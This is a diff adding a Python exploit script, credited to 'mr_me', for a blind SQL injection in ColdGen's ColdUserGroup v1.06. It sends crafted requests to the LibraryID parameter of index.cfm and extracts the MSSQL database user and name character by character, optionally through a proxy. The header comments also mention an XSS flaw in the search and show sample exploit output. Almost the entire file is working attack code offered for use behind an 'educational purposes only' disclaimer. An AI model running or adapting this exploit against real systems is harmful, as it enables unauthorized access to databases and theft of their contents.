@@ -1,0 +1,124 @@
+#!/usr/bin/python
+# ColdGen - coldusergroup v1.06 0day Remote Blind SQL Injection Exploit
+# Vendor: http://www.coldgen.com/
+# Found by: mr_me
+# ----------------------------------------------->
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# ----------------------------------------------->
+# The vulnerabilities:
+# ===================
+# - Blind SQL Injection in the index.cfm using parameters: ArticleID & LibraryID
+# - XSS in the search 
+# 
+# This tool assumes the target has a MSSQL backend.
+# ./ColdUsrGrp0day.py -p localhost:8080 -s "Author:" -t localhost:8500 -d /coldusrgrp/
+#
+# 	| ----------------------------------------------------------------- |
+# 	|  -= ColdUserGroup v1.6 0day Remote Blind SQL Injection Exploit =- |
+# 	| -------------------[ by mr_me - net-ninja.net ]------------------ |
+# 
+# (+) Exploiting target @: http://localhost:8500/coldusrgrp/
+# (+) Using string 'Author:' for the true page
+# (+) This will take time, have patience..
+#
+# (+) Testing Proxy...
+# (+) Proxy @ localhost:8080
+# (+) Building Handler..
+# 
+# (!) Getting database user: sa
+# (!) Getting database name: coldusergroup
+
+import sys, urllib, re
+from optparse import OptionParser
+
+usage = "./%prog [<options>] -s [true string] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -s 'Author:' -t localhost:8500 -d /coldusrgrp/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="directory",
+                  help="Directory path to the CMS")
+parser.add_option("-s", type="string", action="store", dest="trueStr",
+                  help="String that is on the 'true' page")
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n\t| ----------------------------------------------------------------- |"
+    print "\t|  -= ColdUserGroup v1.6 0day Remote Blind SQL Injection Exploit =- |"
+    print "\t| -------------------[ by mr_me - net-ninja.net ]------------------ |\n"
+
+if len(sys.argv) < 5:
+	banner()
+	parser.print_help()
+	sys.exit(1)
+
+def setTargetHTTP():
+	if options.target[0:7] != 'http://':
+		options.target = "http://" + options.target
+	return options.target
+	
+def getProxy():
+	try:
+		proxy = {'http': "http://"+options.proxy}
+		opener = urllib.FancyURLopener(proxy)
+	except(socket.timeout):
+		print "\n(-) Proxy Timed Out"
+		sys.exit(1)
+	except(),msg:
+		print "\n(-) Proxy Failed"
+		sys.exit(1)
+	return opener
+	
+def getRequest(exploit):
+	if options.proxy:
+		try:
+			options.target = setTargetHTTP()
+			opener = getProxy()
+			check = opener.open(options.target+options.directory+exploit).read()
+		except urllib.error.HTTPError, error:
+			check = error.read()
+		except socket.error:
+			print "(-) Proxy connection failed"
+			sys.exit(1)
+	else:
+		try:
+			check = urllib.urlopen(options.target+options.directory+exploit).read()
+		except urllib.error.HTTPError, error:
+			check = error.read()
+		except urllib.error.URLError:
+			print "(-) Target connection failed, check your address"
+			sys.exit(1)
+	return check
+
+basicInfo = {'user':'user_name(0)', 'name':'db_name(0)'}
+
+def getBasicInfo(info, x):
+    for i in range(32,126):
+		request = ("index.cfm?actcfug=LibraryView&LibraryID=209+AND+ISNULL"
+		"(ASCII(SUBSTRING(CAST((SELECT+LOWER("+info+"))AS+varchar(8000)),"+str(x)+",1)),0)="+str(i))
+		result = getRequest(request)
+		if re.search(options.trueStr,result):
+			x = x+1
+			sys.stdout.write(chr(i))
+			getBasicInfo(info, x)
+	
+if __name__ == "__main__":
+	x = 1
+	banner()
+	options.target = setTargetHTTP()
+	print "(+) Exploiting target @: %s" % (options.target+options.directory)
+	print "(+) Using string '%s' for the true page" % (options.trueStr)
+	print "(+) This will take time, have patience.."
+	if options.proxy:
+		print "\n(+) Testing Proxy..."
+		print "(+) Proxy @ %s" % (options.proxy)
+		print "(+) Building Handler.."
+
+	for key in basicInfo:
+		sys.stdout.write("\n(!) Getting database " + key + ": ")
+		getBasicInfo(basicInfo[key], x)
